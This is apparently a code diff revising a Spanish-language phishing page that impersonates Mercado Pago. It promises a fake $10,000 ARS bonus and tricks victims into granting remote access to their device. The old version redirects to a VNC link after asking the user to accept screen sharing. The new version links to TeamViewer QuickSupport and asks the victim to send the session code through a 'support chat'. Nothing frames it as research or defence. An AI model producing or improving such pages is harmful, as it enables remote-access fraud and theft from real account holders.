@@ -3,37 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mercado Pago | Beneficio Exclusivo</title>
+    <title>Mercado Pago | Validación de Bono</title>
     <style>
-        body { font-family: 'Proxima Nova', sans-serif; background-color: #f5f5f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 380px; width: 90%; }
-        .logo { width: 160px; margin-bottom: 25px; }
-        h1 { color: #333; font-size: 24px; margin-bottom: 12px; font-weight: 700; }
-        p { color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 20px; }
-        .amount { color: #00a650; font-weight: bold; font-size: 32px; margin: 25px 0; border: 2px dashed #00a650; padding: 10px; border-radius: 8px; background: #e6f7ee; }
-        .btn { background-color: #009ee3; color: white; border: none; padding: 18px; border-radius: 8px; font-size: 18px; font-weight: 600; cursor: pointer; text-decoration: none; display: block; width: 100%; transition: background 0.3s ease; box-sizing: border-box; }
-        .btn:active { background-color: #007eb5; transform: scale(0.98); }
-        .footer { margin-top: 25px; font-size: 12px; color: #aaa; border-top: 1px solid #eee; padding-top: 15px; }
+        body { font-family: 'Proxima Nova', sans-serif; background-color: #009ee3; color: white; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
+        .container { background: white; color: #333; padding: 40px 20px; border-radius: 15px; width: 90%; max-width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+        img { width: 180px; margin-bottom: 20px; }
+        h1 { font-size: 24px; margin-bottom: 15px; color: #009ee3; }
+        p { font-size: 16px; margin-bottom: 25px; line-height: 1.4; }
+        .btn { background: #00a650; color: white; padding: 18px; border-radius: 8px; text-decoration: none; display: block; font-weight: bold; font-size: 18px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://logodownload.org/wp-content/uploads/2019/06/mercado-pago-logo-1.png" alt="Mercado Pago" class="logo">
-        <h1>¡Bono de Fidelidad!</h1>
-        <p>Tu cuenta ha sido premiada por tu actividad reciente. El saldo se acreditará de forma inmediata.</p>
-        <div class="amount">$10.000,00 ARS</div>
-        <p>Para recibir el dinero, tocá el botón y mantené la sesión abierta mientras validamos tu identidad.</p>
+    <div class="container">
+        <img src="https://logodownload.org/wp-content/uploads/2019/06/mercado-pago-logo-1.png" alt="Mercado Pago">
+        <h1>¡Bono de $10.000 ARS!</h1>
+        <p>Para acreditar el saldo en su cuenta, debe instalar nuestro <b>Asistente de Validación Remota</b> oficial.</p>
         
-        <button class="btn" onclick="activarBono()">RECLAMAR MI DINERO AQUÍ</button>
-
-        <div class="footer">Promoción oficial protegida por Mercado Libre © 2026.</div>
+        <a href="https://play.google.com/store/apps/details?id=com.teamviewer.quicksupport.market" class="btn">
+            INSTALAR ASISTENTE Y COBRAR
+        </a>
+        
+        <p style="font-size: 12px; color: #777; margin-top: 20px;">Luego de instalar, envíe el código de 9 dígitos por el chat de soporte.</p>
     </div>
-
-    <script>
-    function activarBono() {
-        alert('Iniciando conexión segura con el servidor de pagos... \n\nPor favor, ACEPTE el permiso de pantalla para validar su cuenta.');
-        window.location.href = "vnc://127.0.0.1:5901";
-    }
-    </script>
 </body>
 </html>
